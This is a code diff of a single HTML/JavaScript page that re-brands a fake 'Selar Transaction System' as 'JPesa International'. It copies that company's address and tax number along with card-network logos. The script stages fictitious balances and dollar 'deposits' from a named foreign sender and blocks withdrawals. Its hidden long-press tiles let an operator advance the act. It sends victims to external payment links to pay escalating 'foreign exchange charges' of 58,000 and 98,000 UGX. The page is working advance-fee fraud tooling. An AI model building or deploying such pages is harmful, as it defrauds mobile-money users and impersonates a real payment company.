@@ -3,217 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selar Transaction System</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Selar Transaction System - JPesa Theme</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00b97c;
-            --bg-light: #f4f7f6;
-            --text-dark: #333;
-            --selar-brown: #8b4513;
+            --jpesa-blue: #1a73e8;
+            --jpesa-red: #d93025;
+            --bg-light: #f1f3f4;
+            --dark-text: #202124;
+            --border-gray: #dadce0;
         }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-light);
             margin: 0;
             display: flex;
             justify-content: center;
-            align-items: center;
             min-height: 100vh;
-            color: var(--text-dark);
         }
 
         .container {
             background: white;
             width: 100%;
-            max-width: 450px;
-            padding: 30px;
-            border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            text-align: center;
+            max-width: 500px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
             position: relative;
+            overflow: hidden;
         }
 
-        .logo-circle {
-            background: #814420;
-            color: white;
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
+        /* JPesa Header Theme */
+        .top-banner {
+            height: 60px;
+            background: linear-gradient(90deg, #ffffff 0%, #1a73e8 70%, #8ab4f8 100%);
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 20px;
-            margin: 0 auto 20px;
+            padding: 0 15px;
         }
 
-        h1 { color: #814420; margin: 0; font-size: 1.4rem; }
-        h1 span { color: var(--primary); display: block; font-size: 1.8rem; }
+        .payment-icons { height: 30px; }
 
-        /* Form Styles */
-        .form-group { text-align: left; margin-bottom: 15px; }
-        label { font-size: 0.75rem; color: #999; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #eee;
-            border-radius: 12px;
-            box-sizing: border-box;
-            background: #fafafa;
-            font-size: 1rem;
-        }
+        .header-content { text-align: right; padding: 20px; }
+        .jpesa-title { color: var(--jpesa-red); font-size: 1.2rem; font-weight: bold; margin: 0; }
+        .jpesa-sub { font-size: 0.7rem; color: #555; line-height: 1.2; }
 
-        .btn-main {
-            background: var(--primary);
+        .bank-logo { color: var(--jpesa-blue); font-size: 60px; margin: 20px; }
+
+        /* Form Styling */
+        .form-section { padding: 0 30px 30px; }
+        .debit-note-bar { background: black; color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
+        
+        .field { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 0.75rem; font-weight: bold; color: #666; text-transform: uppercase; margin-bottom: 4px; }
+        input { width: 100%; padding: 12px; border: 1px solid var(--border-gray); border-radius: 4px; box-sizing: border-box; background: #fafafa; }
+
+        .btn-action {
+            background: #00a65a;
             color: white;
             border: none;
             width: 100%;
-            padding: 18px;
+            padding: 15px;
             border-radius: 30px;
             font-weight: bold;
-            font-size: 1rem;
             cursor: pointer;
-            margin-top: 20px;
-            box-shadow: 0 10px 20px rgba(0,185,124,0.2);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin-top: 10px;
         }
 
-        /* Dashboard Styles */
-        .dashboard { display: none; text-align: left; }
-        .balance-card { background: #f9f9f9; padding: 20px; border-radius: 15px; margin-bottom: 15px; }
-        .amount { font-size: 2rem; font-weight: 800; color: var(--primary); }
-        .notif-box { background: #e8f5e9; border-left: 5px solid var(--primary); padding: 15px; border-radius: 8px; font-size: 0.9rem; margin-bottom: 20px; }
-        
-        /* Payment Grid */
-        .payment-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
-        .pay-icon { border: 1px solid #eee; border-radius: 8px; padding: 10px; cursor: pointer; background: white; transition: 0.3s; }
-        .pay-icon img { width: 100%; height: auto; max-height: 30px; object-fit: contain; }
+        /* Dashboard Receipt Style */
+        .receipt-card {
+            border: 1px solid var(--border-gray);
+            padding: 15px;
+            position: relative;
+            background: #fff;
+            margin-top: 15px;
+        }
 
-        /* Modal Overlay */
-        .overlay {
+        .watermark-paid {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%) rotate(-30deg);
+            font-size: 80px;
+            color: rgba(217, 48, 37, 0.15);
+            font-weight: 900;
+            pointer-events: none;
+            border: 8px solid rgba(217, 48, 37, 0.15);
+            padding: 10px;
             display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
         }
 
-        .modal {
-            background: white;
-            padding: 25px;
-            border-radius: 20px;
-            max-width: 350px;
-            width: 100%;
-            text-align: center;
-            animation: popIn 0.3s ease-out;
-        }
+        .active-watermark .watermark-paid { display: block; }
 
-        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        /* Payment Icons Grid */
+        .payment-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
+        .pay-box { border: 1px solid var(--border-gray); border-radius: 8px; padding: 10px; text-align: center; cursor: pointer; font-size: 0.7rem; font-weight: bold; background: #fff; }
 
-        .loading-ring {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--primary);
-            border-radius: 50%;
-            width: 40px; height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 15px auto;
-        }
+        /* Modals */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .modal { background: white; padding: 25px; border-radius: 8px; max-width: 400px; width: 100%; text-align: center; }
+
+        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .hidden { display: none; }
-        .footer-text { font-size: 0.7rem; color: #999; margin-top: 30px; }
     </style>
 </head>
 <body>
 
 <div class="container" id="app">
-    <div id="loginPage">
-        <div class="logo-circle">Selar</div>
-        <h1>SELAR TRANSACTION <span>SYSTEM</span></h1>
-        <hr style="width: 40px; border: 2px solid var(--primary); border-radius: 10px;">
-        
-        <div class="form-group" style="margin-top:30px;">
-            <label>Legal Full Name</label>
-            <input type="text" id="regName" placeholder="Enter your full name">
+    <div class="top-banner">
+        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center;">
+            <span style="color:#0033a0; font-weight:bold; font-size: 12px; margin-right: 5px;">VISA</span>
+            <span style="color:#eb001b; font-weight:bold; font-size: 12px;">mastercard</span>
         </div>
-        <div class="form-group">
-            <label>Telephone Number</label>
-            <input type="text" id="regPhone" placeholder="+256...">
-        </div>
-        <div class="form-group">
-            <label>Email Address</label>
-            <input type="email" id="regEmail" placeholder="your@email.com">
-        </div>
-        <div style="display: flex; gap: 10px;">
-            <div class="form-group">
-                <label>Password</label>
-                <input type="password" placeholder="******">
-            </div>
-            <div class="form-group">
-                <label>Confirm</label>
-                <input type="password" placeholder="******">
-            </div>
-        </div>
-        <button class="btn-main" onclick="register()">OPEN YOUR SELAR ACCOUNT</button>
     </div>
 
-    <div id="dashboard" class="dashboard">
-        <h3 id="dashTitle">Welcome, User</h3>
-        <div class="balance-card">
-            <small>Available Balance</small>
-            <div class="amount" id="ugxBalance">0.00UGX</div>
-            <div style="color: #666;">Exact: <span id="usdBalance">0.00</span>$</div>
+    <div class="header-content">
+        <p class="jpesa-title">JPesa International</p>
+        <p class="jpesa-sub">Plot Z, Akright City, Entebbe Road<br>Kampala, UG | (256) 414 670513<br>TIN: 1014981413</p>
+    </div>
+
+    <div id="loginPage" class="form-section">
+        <div class="bank-logo">🏛️</div>
+        <div class="debit-note-bar">REGISTRATION SYSTEM</div>
+        
+        <div class="field"><label>Legal Full Name</label><input type="text" id="regName" placeholder="Wasswa Lawrence"></div>
+        <div class="field"><label>Telephone Number</label><input type="text" id="regPhone" placeholder="256..."></div>
+        <div class="field"><label>Email Address</label><input type="email" id="regEmail" placeholder="lawrence@gmail.com"></div>
+        <div style="display:flex; gap:10px;">
+            <div class="field" style="flex:1;"><label>Password</label><input type="password" placeholder="******"></div>
+            <div class="field" style="flex:1;"><label>Confirm</label><input type="password" placeholder="******"></div>
+        </div>
+        <button class="btn-action" onclick="register()">OPEN YOUR SELAR ACCOUNT</button>
+    </div>
+
+    <div id="dashboard" class="form-section" style="display:none;">
+        <div class="debit-note-bar">DASHBOARD ACCOUNT</div>
+        
+        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 5px solid var(--jpesa-blue);">
+            <div style="font-size: 0.8rem; color: #666;">AVAILABLE BALANCE</div>
+            <div id="ugxBalance" style="font-size: 1.8rem; font-weight: bold; color: var(--jpesa-blue);">0.00UGX</div>
+            <div style="font-size: 0.9rem;">Exact: <span id="usdBalance" style="font-weight: bold;">0.00</span>$</div>
         </div>
 
-        <div class="notif-box" id="mainNotif">
-            successfully registered your SIM Card on Selar transaction system you can send and receive transactions globally
+        <div id="mainNotif" class="receipt-card">
+            <div class="watermark-paid">PAID</div>
+            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;">Successfully registered your SIM Card on Selar system. Send/Receive globally.</p>
         </div>
 
-        <div style="display:flex; gap: 10px;">
-            <button class="btn-main" style="margin:0; flex:1;" onclick="handleAction()">Withdrawal</button>
-            <button class="btn-main" style="margin:0; flex:1; background:#814420;" onclick="handleAction()">Receive</button>
+        <div style="display:flex; gap:10px; margin-top:15px;">
+            <button class="btn-action" style="margin:0; background: var(--jpesa-blue);" onclick="handleAction()">Withdrawal</button>
+            <button class="btn-action" style="margin:0; background: #444;" onclick="handleAction()">Receive</button>
         </div>
 
         <div class="payment-grid">
-            <div class="pay-icon" id="airtelBtn" onmousedown="startLong(event)" onmouseup="endLong()" ondblclick="quickClick()" onclick="quickClick()"><b>AIRTEL</b></div>
-            <div class="pay-icon" id="mtnBtn" onmousedown="startLong(event)" onmouseup="endLong()" ondblclick="quickClick()" onclick="quickClick()"><b>MTN MOMO</b></div>
-            <div class="pay-icon"><b>STRIPE</b></div>
-            <div class="pay-icon"><b>EPAY</b></div>
-            <div class="pay-icon"><b>MASTER</b></div>
-            <div class="pay-icon"><b>PESAPAL</b></div>
-            <div class="pay-icon" id="epaySpecial" onmousedown="startEpayLong(event)" onmouseup="endEpayLong()"><b>PAYPAL</b></div>
+            <div class="pay-box" id="airtelBtn" onmousedown="startLong()" onmouseup="endLong()" onclick="quickClick()"><span style="color:red">AIRTEL</span></div>
+            <div class="pay-box" id="mtnBtn" onmousedown="startLong()" onmouseup="endLong()" onclick="quickClick()"><span style="color:#ffcc00">MTN MOMO</span></div>
+            <div class="pay-box">STRIPE</div>
+            <div class="pay-box" id="epaySpecial" onmousedown="startEpayLong()" onmouseup="endEpayLong()">EPAY</div>
         </div>
 
-        <div id="recentActivity" style="padding: 15px; background: #fff; border-radius: 10px; border: 1px solid #eee;">
-            <b style="color: #999; font-size: 0.8rem;">RECENT ACTIVITY</b>
-            <div id="activityLog" style="margin-top: 10px; color: var(--primary); font-weight: bold;">No recent transactions</div>
+        <div id="recentActivity" class="receipt-card" style="border-top: 3px solid #eee;">
+            <label>Recent Activity</label>
+            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.9rem;">No transactions</div>
         </div>
-    </div>
-
-    <div class="footer-text">
-        🔒 SSL 256-BIT SECURE<br>
-        © 2026 SELAR TRANSACTION SYSTEM
     </div>
 </div>
 
 <div id="overlay" class="overlay">
-    <div class="modal" id="modalContent">
-        </div>
+    <div class="modal" id="modalContent"></div>
 </div>
 
 <script>
-    let state = JSON.parse(localStorage.getItem('selarState')) || { step: 0, name: '', phone: '' };
-    let longPressTimer;
+    let state = JSON.parse(localStorage.getItem('jpesaState')) || { step: 0, name: '', phone: '' };
+    let longTimer;
 
-    window.onload = () => {
-        if(state.step > 0) renderStep();
-    }
+    window.onload = () => { if(state.step > 0) renderStep(); };
 
-    function save() { localStorage.setItem('selarState', JSON.stringify(state)); }
+    function save() { localStorage.setItem('jpesaState', JSON.stringify(state)); }
 
     function register() {
         state.name = document.getElementById('regName').value;
@@ -221,120 +186,86 @@
         state.step = 1;
         save();
         renderStep();
-        
-        // Initial Deposit detection after 11 seconds
-        setTimeout(() => {
-            if(state.step === 1) showDepositModal(200);
-        }, 11000);
+        setTimeout(() => { if(state.step === 1) showDepositModal(200); }, 11000);
     }
 
     function renderStep() {
         document.getElementById('loginPage').style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
-        document.getElementById('dashTitle').innerText = "Dashboard: " + state.name;
 
         if(state.step === 2) {
             document.getElementById('ugxBalance').innerText = "743,000UGX";
             document.getElementById('usdBalance').innerText = "200.00";
-            document.getElementById('mainNotif').innerHTML = `Your SIM Card doesn't support dollar deposit, Recharge your SIM Card with foreign exchange charge of 58,000UGX, Click withdrawal then on the next page fill in your mobile number ${state.phone.substring(0,2)}XXX and you allow notification to deposit invoice transaction on Your mobile number account`;
-            document.getElementById('activityLog').innerText = "Received Amount 200.00$ from lolikishee, USA CHICAGO";
-            document.getElementById('activityLog').style.color = "blue";
+            document.getElementById('notifText').innerHTML = `Your SIM Card doesn't support dollar deposit. Recharge with exchange charge of <b>58,000UGX</b>. Click withdrawal and fill ${state.phone.substring(0,2)}XXX.`;
+            document.getElementById('activityLog').innerText = "Received 200.00$ from lolikishee, USA";
         }
 
         if(state.step === 3) {
-            // After clicking "OK" on the error
-            document.getElementById('mainNotif').style.background = "#fff";
-            document.getElementById('mainNotif').style.border = "2px dashed #814420";
-            document.getElementById('mainNotif').innerHTML = `<div style="text-align:center"><b>PAID!</b><br>Foreign exchange charge: 58,000UGX<br>Account: ${state.name}<br>Phone: ${state.phone}<br><small>Contact sender to increase transaction</small></div>`;
-            // Disable everything
-            document.querySelectorAll('.btn-main').forEach(b => b.onclick = null);
+            document.getElementById('mainNotif').classList.add('active-watermark');
+            document.getElementById('notifText').innerHTML = `<b>PAID!</b> Foreign exchange charge 58,000UGX.<br>User: ${state.name}<br>Phone: ${state.phone}`;
+            document.querySelectorAll('.btn-action').forEach(b => b.onclick = null);
         }
 
         if(state.step === 4) {
             document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
             document.getElementById('usdBalance').innerText = "800.00";
-            document.getElementById('mainNotif').innerHTML = `Foreign exchange charge needed 98,000UGX to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number ${state.phone.substring(0,2)}XXX and you allow notification to deposit invoice transaction on Your mobile number account`;
-            document.getElementById('activityLog').innerText = "Received Amount 800.00$ from lolikishee, USA CHICAGO";
+            document.getElementById('notifText').innerHTML = `Exchange charge needed <b>98,000UGX</b> to allow 800$ into UGX. Click withdrawal and fill ${state.phone.substring(0,2)}XXX.`;
+            document.getElementById('activityLog').innerText = "Received 800.00$ from lolikishee, USA";
         }
     }
 
     function showDepositModal(amount) {
-        const overlay = document.getElementById('overlay');
-        const modal = document.getElementById('modalContent');
-        overlay.style.display = 'flex';
-        modal.innerHTML = `
+        const ov = document.getElementById('overlay');
+        ov.style.display = 'flex';
+        document.getElementById('modalContent').innerHTML = `
             <h3>Deposit Detected</h3>
-            <p>Deposit of ${amount}$ on Sender id A001112, Name: lolikishee, Address: USA CHICAGO</p>
-            <p>Press confirm to initiate the transaction on Your Selar account.</p>
-            <button class="btn-main" onclick="confirmDeposit(${amount})">Confirm</button>
+            <p>Amount: <b>${amount}.00$</b><br>Sender: lolikishee (A001112)<br>Address: USA CHICAGO</p>
+            <button class="btn-action" onclick="confirmDeposit(${amount})">CONFIRM TRANSACTION</button>
         `;
     }
 
-    function confirmDeposit(amount) {
-        const modal = document.getElementById('modalContent');
-        modal.innerHTML = `
-            <div class="loading-ring"></div>
-            <p>Always confirm any Transaction invoice on Your Selar account when ever You login for safety of transaction</p>
-        `;
+    function confirmDeposit(amt) {
+        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Always confirm any Transaction invoice on Your Selar account for safety.</p>`;
         setTimeout(() => {
             document.getElementById('overlay').style.display = 'none';
-            state.step = (amount === 200) ? 2 : 4;
-            save();
-            renderStep();
+            state.step = (amt === 200) ? 2 : 4;
+            save(); renderStep();
         }, 6000);
     }
 
     function handleAction() {
-        let link = (state.step >= 4) ? "https://pay.guto.app/@selara4?a=98000" : "https://pay.guto.app/@selara4?a=58000";
-        window.location.href = link;
+        window.location.href = state.step >= 4 ? "https://pay.guto.app/@selara4?a=98000" : "https://pay.guto.app/@selara4?a=58000";
     }
 
-    // Long Press Logic for Airtel/MTN
+    function quickClick() { if(state.step < 3) alert("Can't access. Allow foreign charges to make withdrawal."); }
+
     function startLong() {
         if(state.step === 3) return;
-        longPressTimer = setTimeout(() => {
-            const modal = document.getElementById('modalContent');
+        longTimer = setTimeout(() => {
             document.getElementById('overlay').style.display = 'flex';
-            modal.innerHTML = `<div class="loading-ring"></div><p>Depositing the transaction of 743,000UGX Selar invoice to ${state.phone} ${state.name}</p>`;
-            
+            document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Depositing 743,000UGX to ${state.phone}...</p>`;
             setTimeout(() => {
-                modal.innerHTML = `
-                    <div style="color:red; font-weight:bold;">ATTENTION</div>
-                    <p>Accuse us our Customer, Selar system Can't allow withdraw of international transaction which is less than 1million Ugandan Shillings, Please Consult the sender to top up the invoice to enable the withdraw directly to your Sim card</p>
-                    <button class="btn-main" onclick="closeAndLock()">Okay have understood!</button>
-                `;
+                document.getElementById('modalContent').innerHTML = `
+                    <h3 style="color:red">WITHDRAWAL DENIED</h3>
+                    <p>Selar system doesn't allow withdrawals of international transactions less than 1,000,000 UGX. Please top up.</p>
+                    <button class="btn-action" onclick="closeAndLock()">Okay, I Understand</button>`;
             }, 10000);
         }, 5000);
     }
 
-    function closeAndLock() {
-        document.getElementById('overlay').style.display = 'none';
-        state.step = 3;
-        save();
-        renderStep();
-    }
+    function closeAndLock() { document.getElementById('overlay').style.display = 'none'; state.step = 3; save(); renderStep(); }
 
-    function quickClick() {
-        if(state.step === 3) return;
-        alert("can't access allow foreign charges to make withdrawal");
-    }
-
-    function endLong() { clearTimeout(longPressTimer); }
-
-    // EPAY logic
     function startEpayLong() {
         if(state.step !== 3) return;
-        longPressTimer = setTimeout(() => {
-            const modal = document.getElementById('modalContent');
+        longTimer = setTimeout(() => {
             document.getElementById('overlay').style.display = 'flex';
-            modal.innerHTML = `<div class="loading-ring"></div><p>Configuring deposit of 800$ from Sender id A001112 to your Selar Account please wait to confirm the transaction.</p>`;
-            
-            setTimeout(() => {
-                showDepositModal(800);
-            }, 11000);
+            document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Configuring 800$ deposit from A001112...</p>`;
+            setTimeout(() => showDepositModal(800), 11000);
         }, 5000);
     }
-    function endEpayLong() { clearTimeout(longPressTimer); }
+
+    function endLong() { clearTimeout(longTimer); }
+    function endEpayLong() { clearTimeout(longTimer); }
 </script>
 </body>
 </html>
